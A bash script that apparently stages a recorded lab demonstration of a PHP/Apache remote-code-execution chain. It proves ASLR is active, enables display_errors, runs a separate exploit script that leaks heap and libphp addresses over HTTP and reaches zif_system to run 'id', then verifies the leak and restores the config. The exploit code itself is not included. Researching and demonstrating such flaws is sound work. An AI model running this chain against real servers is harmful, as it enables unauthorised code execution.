#!/bin/bash
# One-command ASLR demo for screen recording.
# Run on the target: bash ~/demo_aslr_video.sh
set -u
cd /home/debian/php2shell-work
S() { sudo -n "$@"; }
line() { printf '======================================================================\n'; }
say() { echo; line; printf '%s\n' "$*"; line; sleep 0.8; }
worker() { local m; m=$(pgrep -o -x apache2); [ -n "$m" ] && pgrep -P "$m" -x apache2 | tail -1; }
libbase() { S grep 'libphp.so' "/proc/$1/maps" 2>/dev/null | head -1 | cut -d- -f1; }
restart_aslr() {
  S bash -c 'apache2ctl -k stop 2>/dev/null; sleep 0.5; pkill -9 apache2 2>/dev/null; sleep 0.5; pkill -9 gdb 2>/dev/null; /usr/sbin/apache2ctl -k start; sleep 0.8' >/dev/null 2>&1
  local i
  for i in $(seq 1 50); do
    [ -n "$(pgrep -o -x apache2)" ] && [ -n "$(worker)" ] && return 0
    sleep 0.1
  done
  return 1
}

clear 2>/dev/null || true
say "0) Target page (plain echo, no session_start)"
S cat /var/www/php-lab/www/index.php
echo

say "1) Remote proof that ASLR is enabled"
echo -n "kernel.randomize_va_space = "
cat /proc/sys/kernel/randomize_va_space
echo "Apache startup method: /usr/sbin/apache2ctl -k start (setarch -R not used)"
echo "setarch occurrences in pure_aslr_run.sh: $(grep -c setarch pure_aslr_run.sh || true)"
restart_aslr
M=$(pgrep -o -x apache2); W=$(worker)
echo "master=$M worker=$W"
echo -n "worker personality = "; S cat "/proc/$W/personality"
echo "worker libphp mapping:"; S grep 'libphp.so' "/proc/$W/maps" | head -1
B1=$(libbase "$W")
sleep 0.5
restart_aslr
M2=$(pgrep -o -x apache2); W2=$(worker)
echo "restart#2 master=$M2 worker=$W2"
echo -n "restart#2 worker personality = "; S cat "/proc/$W2/personality"
echo "restart#2 libphp mapping:"; S grep 'libphp.so' "/proc/$W2/maps" | head -1
B2=$(libbase "$W2")
echo "libphp base #1 = $B1"
echo "libphp base #2 = $B2"
if [ -n "$B1" ] && [ -n "$B2" ] && [ "$B1" != "$B2" ]; then
  echo "=> libphp base differs after two Apache restarts: ASLR is active"
else
  echo "!! The two bases are identical; check the startup method"
fi

say "2) Set display_errors=1 (the legacy chain's A requires warning output to set headers_sent)"
S sed -i 's/php_admin_value display_errors 0/php_admin_value display_errors 1/' /etc/apache2/conf-available/php8426.conf
grep display_errors /etc/apache2/conf-available/php8426.conf
S rm -f /tmp/p1

say "3) Full pure-HTTP ASLR chain: heap leak -> libphp leak -> zif_system"
CHAIN_LOG=/tmp/demo_chain.log
CMD="id>/tmp/p1" bash pure_aslr_run.sh 2>&1 | tee "$CHAIN_LOG"

say "4) Command execution result"
if S test -f /tmp/p1; then
  S cat /tmp/p1
else
  echo "NO PROOF FILE"
fi

say "5) Cross-check: leaked libphp base vs current worker maps"
LEAK=$(grep -oE 'libphp=0x[0-9a-f]+' "$CHAIN_LOG" | grep -v '=0x0$' | tail -1 | sed 's/.*=0x//')
W=$(worker)
if [ -n "${LEAK:-}" ] && [ -n "$W" ]; then
  MAP=$(libbase "$W")
  echo "libphp base leaked via Set-Cookie = 0x$LEAK"
  echo "libphp in worker $W maps = $MAP"
  if [ "0x$LEAK" = "0x$MAP" ]; then
    echo "=> Exact match: the leaked address is real and ASLR is active"
  else
    echo "=> Mismatch (the worker may have been replaced; see the W2 line above)"
  fi
else
  echo "No leaked value or no worker; skipping"
fi

say "6) Restore display_errors=0"
S sed -i 's/php_admin_value display_errors 1/php_admin_value display_errors 0/' /etc/apache2/conf-available/php8426.conf
restart_aslr
grep display_errors /etc/apache2/conf-available/php8426.conf
echo "DEMO DONE"
